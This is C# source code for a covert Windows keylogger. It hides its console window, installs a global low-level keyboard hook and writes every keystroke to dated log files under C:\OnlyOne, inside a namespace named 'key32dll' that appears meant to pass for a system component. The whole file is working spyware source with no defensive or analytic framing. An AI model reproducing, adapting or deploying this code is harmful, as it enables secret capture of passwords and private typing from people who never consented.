using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace key32dll

{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            
        }
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                
                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                if (!Directory.Exists(@"C:\OnlyOne"))
                    Directory.CreateDirectory(@"C:\OnlyOne");
                DateTime now = DateTime.Now;
                StreamWriter sw = new StreamWriter(@"C:\OnlyOne\KeyLogs_" + now.Year+ "." + now.Month + "." + now.Day + ".txt", true);
            
                #region keycodes
                switch ((Keys)vkCode){
                    case Keys.Enter: 
                        sw.WriteLine();
                        break;
                    case Keys.LShiftKey:
                        sw.Write("{Shift}");
                        break;
                    case Keys.RShiftKey:
                        sw.Write("{Shift}");
                        break;
                    case Keys.Back:
                        sw.Write("{Delete1}");
                        break;
                    case Keys.Space:
                        sw.Write(" ");
                        break;
                    // OEM
                    case Keys.Oemcomma:
                        sw.Write(",");
                        break;
                    case Keys.Oem1:
                        sw.Write(":");
                        break;
                    case Keys.OemQuestion:
                        sw.Write("?");
                        break;
                    case Keys.OemMinus:
                        sw.Write("-");
                        break;
                    case Keys.Oemplus:
                        sw.Write("+");
                        break;
                    // Digital numbers or lithunatian letters
                    case Keys.D0:
                        sw.Write("{D0}");
                        break;
                    case Keys.D1:
                        sw.Write("{D1}");
                        break;
                    case Keys.D2:
                        sw.Write("{D2}");
                        break;
                    case Keys.D3:
                        sw.Write("{D3}");
                        break;
                    case Keys.D4:
                        sw.Write("{D4}");
                        break;
                    case Keys.D5:
                        sw.Write("{D5}");
                        break;
                    case Keys.D6:
                        sw.Write("{D6}");
                        break;
                    case Keys.D7:
                        sw.Write("{D7}");
                        break;
                    case Keys.D8:
                        sw.Write("{D8}");
                        break;
                    case Keys.D9:
                        sw.Write("{D9}");
                        break;
                    // Num Pad
                    case Keys.NumPad0:
                        sw.Write("0");
                        break;
                    case Keys.NumPad1:
                        sw.Write("1");
                        break;
                    case Keys.NumPad2:
                        sw.Write("2");
                        break;
                    case Keys.NumPad3:
                        sw.Write("3");
                        break;
                    case Keys.NumPad4:
                        sw.Write("4");
                        break;
                    case Keys.NumPad5:
                        sw.Write("5");
                        break;
                    case Keys.NumPad6:
                        sw.Write("6");
                        break;
                    case Keys.NumPad7:
                        sw.Write("7");
                        break;
                    case Keys.NumPad8:
                        sw.Write("8");
                        break;
                    case Keys.NumPad9:
                        sw.Write("9");
                        break;
                    default: 
                        sw.Write((Keys)vkCode);
                        break;
                };
                #endregion
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        #region Dll imports
        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion
        const int SW_HIDE = 0;
    }
}
